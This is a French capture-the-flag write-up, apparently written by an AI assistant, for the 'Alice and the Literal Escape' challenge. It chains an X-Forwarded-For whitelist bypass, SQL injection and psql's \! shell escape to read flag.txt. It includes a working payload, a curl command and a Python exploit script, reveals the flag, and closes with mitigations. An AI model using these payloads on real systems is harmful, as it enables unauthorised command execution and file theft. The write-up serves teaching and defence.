# Write-up — *Alice and the Literal Escape* 🎯

**Challenge**: Alice and the Literal Escape

**Résumé rapide** 🧭

* L'application est une API FastAPI qui protège l'accès via une middleware de sécurité (whitelist d'IP).
* Un endpoint `/cargo/upload` insère un `note` dans une base PostgreSQL en construisant la requête SQL par concaténation de chaînes.
* Le code lance `psql` via `subprocess` pour exécuter la requête — le client `psql` interprète des *backslash-commands* (ex: `\!`) qui peuvent exécuter des commandes shell côté serveur.
* En combinant contournement de la whitelist (via en-têtes `X-Forwarded-For`) + injection SQL + `\!`, on peut exécuter `cat flag.txt` et récupérer le flag.

---

## 1) Analyse du code (explication pas-à-pas) 🔍

Extraits pertinents du `src.py` :

```py
TRUSTED_IPS = ["127.0.0.1"]
config = SecurityConfig(
    whitelist=TRUSTED_IPS,
    blacklist=[],
)
app.add_middleware(SecurityMiddleware, config=config)

# ...

sql = f"INSERT INTO notes VALUES('"+note+"');"
proc = subprocess.run(
    PSQL,
    input=sql,
    capture_output=True,
    text=True
)
```

Points importants :

* **Whitelist IP** : la middleware n'autorise que `127.0.0.1`. Donc depuis l'extérieur on reçoit `403 Forbidden` si la middleware se base sur l'IP de la connexion.

* **Construction SQL par concaténation** : `sql = "INSERT INTO notes VALUES('"+note+"');"` → **aucune échappement**, donc **SQL injection**.

* **Usage de `psql` via subprocess** : la requête SQL est fournie en entrée à `psql`. Le client `psql` comprend des *backslash-commands* côté client — en particulier `\! <cmd>` exécute `<cmd>` dans le shell sur la machine où `psql` s'exécute et renvoie la sortie.

Ces trois éléments combinés ouvrent une voie d'exploitation claire.

---

## 2) Contournement de la whitelist (Quartermaster) 🛡️➡️🧭

Souvent, les applications web sont placées derrière un proxy qui ajoute des en-têtes comme `X-Forwarded-For` ou `X-Real-IP`. Si la middleware se fie naïvement à ces en-têtes, on peut **usurper** l'IP source.

Dans ce challenge, envoyer `X-Forwarded-For: 127.0.0.1` (ou `X-Real-IP`) est suffisant pour que la requête soit acceptée.

---

## 3) Exploitation — idée générale 🧩

1. Poster un `note` contenant une **injection** qui ferme la chaîne SQL, termine l'INSERT et utilise la backslash-command `\!` pour exécuter `cat flag.txt`.
2. Récupérer la sortie renvoyée par `psql` (elle est affichée dans la page sous forme de JSON : `out` / `err`).

### Exemple conceptuel

Si `note = x'); \! cat flag.txt # `, la ligne envoyée à `psql` devient :

```
INSERT INTO notes VALUES('x'); \! cat flag.txt #');
```

* `INSERT` s'exécute (ou échoue — peu importe),
* `\! cat flag.txt` est exécuté par `psql` côté client et lance `cat flag.txt` dans le shell,
* `#` commente le reste de la ligne **côté shell**, évitant les problèmes de quoting qui casseraient la commande shell.

La sortie de `cat flag.txt` remontera dans `proc.stdout` (champ `out`) et sera affichée sur la page.

---

## 4) Payloads et commandes utilisées 🧪

### Payload qui a fonctionné

```
x'); \! cat flag.txt #
```

**Pourquoi le `#` ?** Parce que `\!` exécute tout ce qui suit dans le shell ; ajouter `#` permet de commenter le reste et d'éviter `unterminated quoted string` ou autres erreurs de quoting shell.

### Commande `curl` (exemple)

> Remplace `:PORT` par le port du challenge.

```bash
curl -v \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Real-IP: 127.0.0.1' \
  -H 'Forwarded: for=127.0.0.1' \
  --form-string "note=x'); \\! cat flag.txt # " \
  'http://challenges.challenge-ecw.eu:PORT/cargo/upload'
```

* `--form-string` évite que `curl` interprète `;`, `@` ou `type=` dans la donnée du formulaire.
* On utilise `\\!` pour s'assurer que `\!` arrive côté serveur (double échappement : un pour le shell local si nécessaire, un pour `curl`).

### Script Python (plus robuste)

```python
import requests
url = "http://challenges.challenge-ecw.eu:PORT/cargo/upload"
headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}
payload = "x'); \\! cat flag.txt # "
r = requests.post(url, headers=headers, data={"note": payload})
print(r.text)
```

Le script Python évite les problèmes d'échappement de shell et est pratique pour itérer sur plusieurs chemins (`/flag.txt`, `/home/app/flag.txt`, etc.).

---

## 5) Résultat obtenu ✅

Dans l'exploit réalisé, la réponse brute contenait :

```json
{
  "rc": 0,
  "out": "ECW{st4rlit_carg0_manif3st}",
  "err": "ERROR:  relation \"notes\" does not exist\n..."
}
```

**Flag** : `ECW{st4rlit_carg0_manif3st}` 🎉

> Remarque : l'erreur `relation "notes" does not exist` est normale — l'INSERT échoue parce que la table n'existe pas, mais `psql` exécute quand même la commande `\!` côté client.

---

## 6) Diagnostics / étapes si tu obtiens des erreurs 🛠️

* **`403 Forbidden`** → vérifier les en-têtes `X-Forwarded-For` / `X-Real-IP`. Tester aussi `Forwarded: for=127.0.0.1`.
* **Warnings de `curl` (skip unknown form field)** → utiliser `--form-string` au lieu de `-F`.
* **`unterminated quoted string`** ou `sh: syntax error` → ajouter `#` après la commande shell (ex : `\! cat flag.txt #`).
* **Pas de sortie dans `out` mais `err` avec `relation "notes" does not exist`** → c'est ok, essayer `id` ou `ls -la /` pour vérifier que `\!` s'exécute :

  * `x'); \! id #`
  * `x'); \! ls -la / #`

---

## 7) Mitigations (comment corriger ça en prod ?) 🔐

1. **Paramétrer les requêtes SQL** (ne jamais concaténer les entrées utilisateur). Par ex. avec `psycopg2` :

```py
cur.execute("INSERT INTO notes VALUES(%s)", (note,))
```

2. **Ne pas exécuter `psql` via `subprocess`** en lui passant des chaînes non-sanitized. Si vous devez exécuter des commandes externes, validez strictement les entrées et utilisez des bibliothèques DB adaptées.

3. **Ne pas faire confiance aux en-têtes `X-Forwarded-For`** sauf si vous êtes sûr d'être derrière un reverse-proxy correctement configuré qui remplace/ajoute ces en-têtes. Vérifier la source de la connexion côté socket si nécessaire.

4. **Filtrer / interdire les backslash-commands** si vous appelez un client `psql` depuis un subprocess et que vous ne pouvez pas l'éviter.

---

## 8) Petit résumé final (pour le write-up) ✍️

* **Vulnérabilités** : confiance sur les en-têtes d'IP (whitelist bypass) + SQL concaténée + usage de `psql` client-side (backslash-commands).
* **Exploit** : `X-Forwarded-For: 127.0.0.1` + `note` = `x'); \! cat flag.txt # ` → lecture du flag.
* **Flag** : `ECW{st4rlit_carg0_manif3st}`

---

Si tu veux, je peux aussi :

* Générer un **PDF** ou un **fichier texte** prêt à envoyer (ou formaté pour un write-up CTF),
* Fournir une **version anglaise** du write-up,
* Ajouter des captures d'écran/commandes exactes à coller dans le rapport.

Dis-moi ce que tu préfères — je peux produire le PDF maintenant. 🙂
